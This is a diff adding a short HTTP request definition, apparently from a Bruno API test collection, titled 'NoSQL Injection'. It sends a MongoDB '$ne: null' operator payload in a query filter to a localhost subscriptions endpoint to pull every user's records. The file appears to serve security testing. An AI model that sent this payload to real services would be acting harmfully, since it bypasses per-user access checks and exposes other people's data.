@@ -1,0 +1,20 @@
+meta {
+  name: NoSQL Injection
+  type: http
+  seq: 2
+}
+
+get {
+  url: http://localhost:8080/my-subscriptions?filter={"user_id":{"$ne":null}}
+  body: none
+  auth: inherit
+}
+
+params:query {
+  filter: {"user_id":{"$ne":null}}
+}
+
+settings {
+  encodeUrl: true
+  timeout: 0
+}
